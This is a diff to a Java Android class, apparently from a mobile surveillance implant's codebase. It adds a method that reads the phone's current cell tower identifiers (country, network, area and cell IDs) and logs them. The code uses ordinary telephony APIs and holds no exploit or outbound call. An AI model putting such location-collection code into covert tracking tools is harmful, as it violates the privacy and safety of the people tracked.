@@ -8,7 +8,11 @@ package com.ht.RCSAndroidGUI;
 
 import android.content.Context;
 import android.provider.Settings;
+import android.telephony.CellLocation;
 import android.telephony.TelephonyManager;
+import android.telephony.cdma.CdmaCellLocation;
+import android.telephony.gsm.GsmCellLocation;
+import android.util.Log;
 
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
@@ -19,6 +23,7 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  */
 public class Device {
 
+	private static final String TAG = "Device";
 	/** The singleton. */
 	private volatile static Device singleton;
 
@@ -125,6 +130,56 @@ public class Device {
 		final TelephonyManager telephonyManager = (TelephonyManager) Status
 				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
 		return telephonyManager.getSubscriberId();
+	}
+	
+	public static CellInfo getCellInfo(){
+
+		
+		android.content.res.Configuration conf = Status.getAppContext()
+				.getResources().getConfiguration();
+		TelephonyManager tm = (TelephonyManager) Status.getAppContext()
+				.getSystemService(Context.TELEPHONY_SERVICE);
+		
+		
+		CellInfo info = new CellInfo();
+
+		
+		CellLocation bcell = tm.getCellLocation();
+
+		if (bcell == null) {
+			Log.d(TAG, "Error: " + "null cell");
+			return info;
+		}
+
+		int rssi = 0; //TODO aggiungere RSSI
+		
+		if (bcell instanceof GsmCellLocation) {
+			Check.asserts(Device.isGprs(), "gprs or not?");
+			GsmCellLocation cell = (GsmCellLocation) bcell;
+			
+			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);
+
+			Log.d(TAG, "info: " + info.toString());
+
+		}
+
+		if (bcell instanceof CdmaCellLocation) {
+			Check.asserts(Device.isCdma(), "cdma or not?");
+			CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();
+			
+			info.setCdma(cell.getSystemId(),cell.getNetworkId(), cell.getBaseStationId(), rssi);
+			info.cdma = true;
+			info.valid = true;
+
+			info.sid = cell.getSystemId();
+			info.nid  = cell.getNetworkId();
+			info.bid = cell.getBaseStationId();
+						
+			Log.d(TAG, "info: " + info.toString());
+
+		}
+		
+		return info;
 	}
 
 }
